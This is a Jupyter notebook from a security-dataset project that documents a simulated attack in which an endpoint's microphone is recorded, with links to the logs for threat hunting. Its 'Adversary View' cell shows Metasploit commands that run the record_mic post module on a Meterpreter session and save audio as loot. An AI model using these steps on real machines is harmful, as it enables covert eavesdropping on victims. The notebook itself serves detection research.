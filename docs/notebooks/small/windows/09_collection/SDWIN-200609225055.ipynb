{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "9a844ea5",
   "metadata": {},
   "source": [
    "# MSF Record Mic"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0545f4d3",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b153c12d",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/06/09 |\n",
    "| Modification Date | 2020/06/09 |\n",
    "| Tactics           | ['[TA0009](https://attack.mitre.org/tactics/TA0009)'] |\n",
    "| Techniques        | ['[T1123](https://attack.mitre.org/techniques/T1123)'] |\n",
    "| Tags              | ['Microphone Access'] |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ef50e924",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries accessing the microphone of an endpoint."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b98b9b93",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9738f74b",
   "metadata": {},
   "source": [
    "\n",
    "| Dataset Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/small/windows/collection/host/msf_record_mic.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/small/windows/collection/host/msf_record_mic.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b03a9782",
   "metadata": {},
   "source": [
    "## Notebooks\n",
    "Notebooks created by the community leveraging the mordor datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3c368f0d",
   "metadata": {},
   "source": [
    "\n",
    "| Author | Name | Link |\n",
    "|:-------|:-----|:-----|\n",
    "| Threat Hunter Playbook | Processes Accessing the Microphone Device | [https://threathunterplaybook.com/notebooks/windows/09_collection/WIN-200609225055.html](https://threathunterplaybook.com/notebooks/windows/09_collection/WIN-200609225055.html) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "85222e1e",
   "metadata": {},
   "source": [
    "## Simulation Plan"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2fcc6930",
   "metadata": {},
   "source": [
    "\n",
    "| Environment | Tool Type | Module |\n",
    "|:------------|:----------|:-------|\n",
    "| Mordor shire | C2 | [post](https://github.com/pwnieexpress/metasploit-framework/blob/master/modules/post/multi/manage/record_mic.rb) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2120d6c2",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "msf5 exploit(multi/handler) > use post/multi/manage/record_mic\n",
    "msf5 post(multi/manage/record_mic) > set SESSION 2\n",
    "SESSION => 2\n",
    "msf5 post(multi/manage/record_mic) > info\n",
    "\n",
    "      Name: Multi Manage Record Microphone\n",
    "    Module: post/multi/manage/record_mic\n",
    "  Platform: Linux, OSX, Windows\n",
    "      Arch: \n",
    "      Rank: Normal\n",
    "\n",
    "Provided by:\n",
    "  sinn3r <sinn3r@metasploit.com>\n",
    "\n",
    "Compatible session types:\n",
    "  Meterpreter\n",
    "\n",
    "Basic options:\n",
    "  Name      Current Setting  Required  Description\n",
    "  ----      ---------------  --------  -----------\n",
    "  DURATION  5                no        Number of seconds to record\n",
    "  SESSION   2                yes       The session to run this module on.\n",
    "\n",
    "Description:\n",
    "  This module will enable and record your target's microphone. For \n",
    "  non-Windows targets, please use Java meterpreter to be able to use \n",
    "  this feature.\n",
    "\n",
    "msf5 post(multi/manage/record_mic) > run\n",
    "\n",
    "[*] 172.18.39.6 - 20%...\n",
    "[*] 172.18.39.6 - 40%...\n",
    "[*] 172.18.39.6 - 60%...\n",
    "[*] 172.18.39.6 - 80%...\n",
    "[*] 172.18.39.6 - 100%...\n",
    "[*] 172.18.39.6 - Audio size: (55169 bytes)\n",
    "[+] 172.18.39.6 - Audio recording saved: /home/msf/.msf4/loot/20200610025201_default_172.18.39.6_172.18.39.6.audi_358712.wav\n",
    "[*] Post module execution completed\n",
    "msf5 post(multi/manage/record_mic) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "033ff551",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f9fa3257",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e7eb6609",
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2562e0ef",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2f832e72",
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/small/windows/collection/host/msf_record_mic.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "eeddd815",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c1265b11",
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT Hostname,Channel,EventID, Count(*) as count\n",
    "FROM mordorTable\n",
    "GROUP BY Hostname,Channel,EventID\n",
    "ORDER BY count DESC\n",
    "'''\n",
    ")\n",
    "df.show(truncate=False)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
